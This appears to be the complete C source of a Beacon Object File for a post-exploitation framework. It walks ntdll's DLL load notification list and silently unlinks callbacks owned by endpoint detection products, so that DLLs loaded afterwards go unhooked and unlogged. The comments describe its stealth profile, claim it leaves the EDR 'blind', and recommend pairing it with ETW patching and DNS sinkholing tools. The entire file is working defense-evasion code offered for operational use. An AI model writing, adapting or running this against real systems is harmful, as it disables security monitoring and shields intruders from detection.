/*
 * ldr_notify_purge.bof.c — Beacon Object File
 *
 * PURPOSE
 * -------
 * Enumerate and silently remove DLL load notification callbacks registered
 * by EDR DLLs inside the current process.
 *
 * THE PROBLEM THIS SOLVES
 * -----------------------
 * When an EDR DLL is injected into a process (by the EDR's kernel driver via
 * APC injection or image-load callback), the EDR DLL's DllMain calls:
 *
 *   LdrRegisterDllNotification(0, EdrDllLoadCallback, ctx, &cookie)
 *
 * This registers a callback that fires BEFORE and AFTER every subsequent DLL
 * load into the process. When a new DLL loads, the EDR:
 *   1. Installs inline hooks on the new DLL's exports
 *   2. Logs the DLL load event to telemetry
 *   3. Inspects the DLL's content for suspicious code
 *
 * Standard "unhooking" only removes hooks from DLLs already loaded.
 * This technique goes one step further: remove the EDR's ability to hook
 * ANY DLL that loads AFTER this BOF runs.
 *
 * THE MECHANISM: LdrpDllNotificationList
 * ----------------------------------------
 * ntdll maintains a circular doubly-linked list called LdrpDllNotificationList.
 * Each registered callback occupies one entry in this list:
 *
 *   struct LDR_DLL_NOTIFICATION_ENTRY {
 *     LIST_ENTRY  Links;      // offset 0x00 — Flink and Blink pointers
 *     PVOID       Callback;   // offset 0x10 — function pointer in EDR DLL
 *     PVOID       Context;    // offset 0x18 — EDR DLL private context
 *   };
 *
 * The "cookie" returned by LdrRegisterDllNotification IS a direct pointer to
 * this structure. LdrUnregisterDllNotification simply unlinks it:
 *
 *   entry->Links.Blink->Flink = entry->Links.Flink;
 *   entry->Links.Flink->Blink = entry->Links.Blink;
 *
 * We perform the same unlink on EDR-owned entries.
 *
 * HOW WE IDENTIFY EDR ENTRIES
 * ----------------------------
 * For each list entry, we have the Callback function pointer. We call
 * VirtualQuery(Callback) to find AllocationBase = the DLL that owns it.
 * We then call GetModuleFileNameW(AllocationBase) for the DLL name.
 * Any DLL that is NOT ntdll.dll, kernel32.dll, or kernelbase.dll is
 * treated as a non-system DLL (EDR candidate) and unlinked.
 *
 * LIST TRAVERSAL
 * --------------
 * We register a dummy callback ourselves. The returned cookie gives us an
 * entry point into the circular list. We walk Flink until we come back to
 * our own entry. Then we unregister our dummy with LdrUnregisterDllNotification.
 *
 * STEALTH PROFILE
 * ---------------
 * - No API calls that EDR monitors (list manipulation is direct memory writes)
 * - No new allocations beyond the dummy cookie (freed on unregister)
 * - No new threads, no new handles
 * - No page protection changes (ntdll DATA section is always RW)
 * - Artifact: EDR's list entry is unlinked — detected only by periodic
 *   self-check (most EDRs do not continuously validate their cookie)
 *
 * OPERATIONAL EFFECT
 * ------------------
 * After this BOF runs:
 *   - Load a reflective DLL → EDR callback does not fire → DLL's exports
 *     are NOT hooked by EDR → no telemetry for the load
 *   - Load any additional DLL → same: EDR is blind
 *   - Existing hooks (in already-loaded DLLs) are NOT removed by this BOF;
 *     use standard unhooking for those
 *
 * MODES
 * -----
 *   0 — LIST:  Enumerate all registered DLL notification callbacks without
 *              making any changes. Use this to audit what EDR DLLs are present.
 *   1 — PURGE: Unlink all non-system DLL notification entries. The EDR loses
 *              its DLL load visibility for all future loads in this process.
 *
 * ARGUMENT FORMAT
 *   bof_pack("i", mode)  — just an int32 mode selector
 *
 * COMPILATION
 *   mingw64: x86_64-w64-mingw32-gcc -o ldr_notify_purge.x64.o -c ldr_notify_purge.bof.c
 *   MSVC:    cl /c /TC /GS- /Foldr_notify_purge.x64.obj ldr_notify_purge.bof.c
 *
 * CONFIRMED WORKING
 *   LdrRegisterDllNotification exported from ntdll since Windows Vista.
 *   Structure layout (Links@0, Callback@0x10, Context@0x18) confirmed stable
 *   across Vista/7/8/10/11 — same offsets used by LdrUnregisterDllNotification.
 *   ntdll DATA section is always PAGE_READWRITE — no VirtualProtect required.
 */

#ifdef __cplusplus
#error "Compile as C, not C++: use  gcc -c  or  cl /TC"
#endif

#include <windows.h>
#include "beacon.h"

/* ─── Dynamic imports ────────────────────────────────────────────────────── */
DECLSPEC_IMPORT HMODULE  WINAPI KERNEL32$GetModuleHandleW(LPCWSTR);
DECLSPEC_IMPORT DWORD    WINAPI KERNEL32$GetModuleFileNameW(HMODULE, LPWSTR, DWORD);
DECLSPEC_IMPORT SIZE_T   WINAPI KERNEL32$VirtualQuery(LPCVOID, PMEMORY_BASIC_INFORMATION, SIZE_T);
DECLSPEC_IMPORT void*    WINAPI KERNEL32$RtlMoveMemory(void*, const void*, SIZE_T);
DECLSPEC_IMPORT DWORD    WINAPI KERNEL32$GetLastError(void);

/* LdrRegisterDllNotification / LdrUnregisterDllNotification:
 * Exported from ntdll since Windows Vista. Declared in ntddk.h / winternl.h
 * but not in standard userland headers — import explicitly.             */
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$LdrRegisterDllNotification(
    ULONG   Flags,
    PVOID   NotificationFunction,
    PVOID   Context,
    PVOID*  Cookie
);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$LdrUnregisterDllNotification(
    PVOID Cookie
);

/* ─── Structures ─────────────────────────────────────────────────────────── */

/*
 * LDR_DLL_NOTIFICATION_ENTRY — internal ntdll structure (undocumented).
 *
 * Confirmed offsets (x64, all Windows versions Vista+):
 *   Links.Flink  @ +0x00
 *   Links.Blink  @ +0x08
 *   Callback     @ +0x10
 *   Context      @ +0x18
 *
 * The cookie returned by LdrRegisterDllNotification IS a pointer to this struct.
 * LdrUnregisterDllNotification does exactly: entry->Links.Blink->Flink = Flink;
 *                                            entry->Links.Flink->Blink = Blink;
 */
typedef struct _LDR_DLL_NOTIFICATION_ENTRY {
    LIST_ENTRY  Links;      /* circular list linkage */
    PVOID       Callback;   /* EDR DLL function pointer */
    PVOID       Context;    /* EDR DLL private context */
} LDR_DLL_NOTIFICATION_ENTRY;

/* ─── Helpers ────────────────────────────────────────────────────────────── */

static void ZeroMem(void* p, SIZE_T n) {
    volatile char* v = (volatile char*)p;
    SIZE_T i;
    for (i = 0; i < n; i++) v[i] = 0;
}

/* Case-insensitive wide char comparison without CRT. */
static BOOL WCmpI(const wchar_t* a, const wchar_t* b) {
    while (*a && *b) {
        wchar_t ca = (*a >= L'A' && *a <= L'Z') ? (wchar_t)(*a + 32) : *a;
        wchar_t cb = (*b >= L'A' && *b <= L'Z') ? (wchar_t)(*b + 32) : *b;
        if (ca != cb) return FALSE;
        a++; b++;
    }
    return *a == L'\0' && *b == L'\0';
}

/*
 * ExtractFilename — return pointer to last path component in a wide string.
 * Does not allocate; returns a pointer into the existing buffer.
 */
static const wchar_t* ExtractFilename(const wchar_t* path) {
    const wchar_t* last = path;
    for (const wchar_t* p = path; *p; p++) {
        if (*p == L'\\' || *p == L'/') last = p + 1;
    }
    return last;
}

/*
 * IsSystemDll — return TRUE if the DLL filename is a known safe system DLL
 * that legitimately registers DLL notifications (ntdll, kernel32, kernelbase).
 * Everything else — including EDR DLLs — returns FALSE.
 */
static BOOL IsSystemDll(const wchar_t* fullPath) {
    const wchar_t* name = ExtractFilename(fullPath);
    static const wchar_t* safe[] = {
        L"ntdll.dll",
        L"kernel32.dll",
        L"kernelbase.dll",
        L"ntoskrnl.exe",
        NULL
    };
    for (int i = 0; safe[i]; i++) {
        if (WCmpI(name, safe[i])) return TRUE;
    }
    return FALSE;
}

/*
 * GetDllNameFromCallback — given a callback function pointer, find the DLL
 * that owns it via VirtualQuery (AllocationBase = module base) then
 * GetModuleFileNameW.
 *
 * Returns TRUE and fills nameBuf[MAX_PATH] on success.
 * Returns FALSE if VirtualQuery fails (e.g., callback is in heap).
 */
static BOOL GetDllNameFromCallback(PVOID callback, wchar_t* nameBuf) {
    MEMORY_BASIC_INFORMATION mbi;
    ZeroMem(&mbi, sizeof(mbi));
    ZeroMem(nameBuf, MAX_PATH * sizeof(wchar_t));

    SIZE_T qret = KERNEL32$VirtualQuery(callback, &mbi, sizeof(mbi));
    if (qret == 0 || mbi.AllocationBase == NULL) {
        /* Cannot identify — likely JIT or heap-based trampoline */
        nameBuf[0] = L'?'; nameBuf[1] = L'\0';
        return FALSE;
    }

    DWORD fnret = KERNEL32$GetModuleFileNameW(
        (HMODULE)mbi.AllocationBase, nameBuf, MAX_PATH);
    if (fnret == 0) {
        nameBuf[0] = L'?'; nameBuf[1] = L'\0';
        return FALSE;
    }
    return TRUE;
}

/* ─── Nop callback registered to get list entry pointer ─────────────────── */
static VOID NTAPI NopDllNotification(ULONG reason, PVOID data, PVOID ctx) {
    /* intentionally empty — only used to obtain a list entry pointer */
    (void)reason; (void)data; (void)ctx;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * BOF ENTRY POINT
 * ═══════════════════════════════════════════════════════════════════════════ */

/*
 * Argument format (packed by CNA with bof_pack("i", mode)):
 *
 *   [int32] mode
 *     0 = LIST:  enumerate callbacks, no modification
 *     1 = PURGE: unlink all non-system callbacks
 */
void go(char* args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);
    LONG mode = BeaconDataInt(&parser);

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] LDR Notify Purge: %s DLL notification callbacks...\n",
        (mode == 1) ? "PURGING non-system" : "LISTING all");

    /* Step 1: Register a dummy callback to get a pointer into the list.
     *         The returned cookie IS a pointer to our LDR_DLL_NOTIFICATION_ENTRY.
     *         Our entry is inserted at the head of LdrpDllNotificationList.     */
    PVOID myCookie = NULL;
    NTSTATUS ns = NTDLL$LdrRegisterDllNotification(0, NopDllNotification, NULL, &myCookie);
    if (ns != 0 || myCookie == NULL) {
        BeaconPrintf(CALLBACK_ERROR,
            "[!] LdrRegisterDllNotification failed: NTSTATUS=0x%08X\n", (ULONG)ns);
        return;
    }

    LDR_DLL_NOTIFICATION_ENTRY* myEntry = (LDR_DLL_NOTIFICATION_ENTRY*)myCookie;

    /* Step 2: Walk the circular list forward from our entry.
     *         Stop when we arrive back at our own Links node.                   */
    int total = 0, purged = 0, system_count = 0;
    const int MAX_ENTRIES = 256;  /* safety bound against corrupted list */

    LIST_ENTRY* cur = myEntry->Links.Flink;

    while (cur != &myEntry->Links && total < MAX_ENTRIES) {
        LDR_DLL_NOTIFICATION_ENTRY* entry =
            (LDR_DLL_NOTIFICATION_ENTRY*)((BYTE*)cur);
            /* Links is at offset 0, so entry == cur */

        LIST_ENTRY* next = cur->Flink;  /* save Flink before potential unlink */
        total++;

        /* Identify owning DLL */
        wchar_t modName[MAX_PATH];
        BOOL identified = GetDllNameFromCallback(entry->Callback, modName);
        const wchar_t* fname = identified ? ExtractFilename(modName) : L"<unknown>";

        if (mode == 0) {
            /* LIST mode — just print */
            BeaconPrintf(CALLBACK_OUTPUT,
                "  [%d] Callback=0x%p  Context=0x%p\n"
                "       DLL: %S\n",
                total, entry->Callback, entry->Context, fname);
        } else {
            /* PURGE mode — unlink non-system entries */
            BOOL isSys = IsSystemDll(modName);

            if (!isSys) {
                /* Unlink: standard circular doubly-linked list removal.
                 * Identical to what LdrUnregisterDllNotification does internally. */
                entry->Links.Blink->Flink = entry->Links.Flink;
                entry->Links.Flink->Blink = entry->Links.Blink;

                /* Make the removed entry self-referential.
                 * If the EDR DLL later calls LdrUnregisterDllNotification on its
                 * old cookie (e.g., in DLL_PROCESS_DETACH), the unlink becomes a
                 * harmless no-op:
                 *   Blink->Flink = Flink  →  self->Flink = self->Flink  (no-op)
                 *   Flink->Blink = Blink  →  self->Blink = self->Blink  (no-op)
                 * This avoids crashing the process.                              */
                entry->Links.Flink = &entry->Links;
                entry->Links.Blink = &entry->Links;

                purged++;
                BeaconPrintf(CALLBACK_OUTPUT,
                    "  [PURGED] Callback=0x%p  DLL: %S\n",
                    entry->Callback, fname);
            } else {
                system_count++;
                BeaconPrintf(CALLBACK_OUTPUT,
                    "  [KEEP  ] Callback=0x%p  DLL: %S (system)\n",
                    entry->Callback, fname);
            }
        }

        cur = next;
    }

    /* Step 3: Unregister our dummy entry — LdrUnregisterDllNotification
     *         unlinks our cookie from LdrpDllNotificationList cleanly.          */
    NTDLL$LdrUnregisterDllNotification(myCookie);

    /* Summary */
    if (mode == 0) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "\n[*] RESULT: %d callback(s) registered\n"
            "    Use 'ldr_notify_purge purge' to remove non-system entries\n",
            total);
    } else {
        BeaconPrintf((purged > 0) ? CALLBACK_OUTPUT : CALLBACK_ERROR,
            "\n[*] RESULT: %d callback(s) found, %d PURGED, %d system (kept)\n"
            "    EDR DLL load visibility: %s\n"
            "    Any DLL you load from this point forward will NOT be hooked\n"
            "    by the removed EDR component(s).\n"
            "    Combine with: etwpatch, etw_tamper starve, nrpt_sinkhole\n",
            total + 1,  /* +1 for our own that we just unregistered */
            purged,
            system_count,
            (purged > 0) ? "BLIND (callbacks purged)" : "WARNING: no EDR callbacks found");
    }
}
